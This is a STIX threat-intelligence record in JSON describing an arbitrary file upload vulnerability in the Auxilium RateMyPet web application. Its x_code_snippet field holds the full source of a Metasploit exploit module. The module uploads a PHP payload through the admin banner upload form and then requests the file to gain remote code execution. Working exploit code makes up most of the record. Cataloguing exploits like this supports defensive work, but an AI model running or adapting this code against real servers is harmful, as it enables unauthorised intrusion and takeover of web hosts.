{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ab91ea74-be60-4cfe-89dc-47861d4b95b4",
    "created": "2024-08-14T17:10:07.337956Z",
    "modified": "2024-08-14T17:10:07.33796Z",
    "name": "\"Auxilium RateMyPet Arbitrary File Upload Vulnerability\"",
    "description": " This module exploits a vulnerability found in Auxilium RateMyPet's. The site banner uploading feature can be abused to upload an arbitrary file to the web server, which is accessible in the 'banner' directory, thus allowing remote code execution.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/auxilium_upload_exec.rb",
            "external_id": "auxilium_upload_exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::PhpEXE\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Auxilium RateMyPet Arbitrary File Upload Vulnerability\",\n      'Description'    => %q{\n          This module exploits a vulnerability found in Auxilium RateMyPet's. The site\n        banner uploading feature can be abused to upload an arbitrary file to the web\n        server, which is accessible in the 'banner' directory, thus allowing remote code\n        execution.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'DaOne',  # Vulnerability discovery\n          'sinn3r'  # Metasploit\n        ],\n      'References'     =>\n        [\n          ['OSVDB', '85554'],\n          ['EDB', '21329']\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\"\n        },\n      'Platform'       => %w{ linux php },\n      'Targets'        =>\n        [\n          [ 'Generic (PHP Payload)', { 'Arch' => ARCH_PHP, 'Platform' => 'php' }  ],\n          [ 'Linux x86'            , { 'Arch' => ARCH_X86, 'Platform' => 'linux'} ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-09-14',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The base directory to the application', '/Auxiliumpetratepro/'])\n      ])\n  end\n\n\n  def check\n    uri = target_uri.path\n    base = File.dirname(\"#{uri}.\")\n\n    res = send_request_raw({\n      'uri' => normalize_uri(\"#{base}/admin/sitebanners/upload_banners.php\")\n    })\n    if res and res.body =~ /\\<title\\>Pet Rate Admin \\- Banner Manager\\<\\/title\\>/\n      return Exploit::CheckCode::Detected\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n\n\n  def upload_exec(base, php_fname, p)\n    data = Rex::MIME::Message.new\n    data.add_part('http://', nil, nil, \"form-data; name=\\\"burl\\\"\")\n    data.add_part('', nil, nil, \"form-data; name=\\\"alt\\\"\")\n    data.add_part(p, 'text/plain', nil, \"form-data; name=\\\"userfile\\\"; filename=\\\"#{php_fname}\\\"\")\n    data.add_part(' Upload', nil, nil, \"form-data; name=\\\"submitok\\\"\")\n\n    post_data = data.to_s\n\n    print_status(\"Uploading payload (#{p.length.to_s} bytes)...\")\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(\"#{base}/admin/sitebanners/upload_banners.php\"),\n      'ctype'  => \"multipart/form-data; boundary=#{data.bound}\",\n      'data'   => post_data,\n    })\n\n    if not res\n      print_error(\"No response from host\")\n      return\n    end\n\n    print_status(\"Requesting '#{php_fname}'...\")\n    res = send_request_raw({'uri'=>normalize_uri(\"#{base}/banners/#{php_fname}\")})\n    if res and res.code == 404\n      print_error(\"Upload unsuccessful: #{res.code.to_s}\")\n      return\n    end\n\n    handler\n  end\n\n\n  def exploit\n    uri = normalize_uri(target_uri.path)\n    uri << '/' if uri[-1,1] != '/'\n    base = File.dirname(\"#{uri}.\")\n\n    php_fname =  \"#{Rex::Text.rand_text_alpha(5)}.php\"\n\n    p = get_write_exec_payload(:unlink_self=>true)\n\n    upload_exec(base, php_fname, p)\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-09-14",
    "x_mitre_platforms": [
        "%w{ linux php }"
    ]
}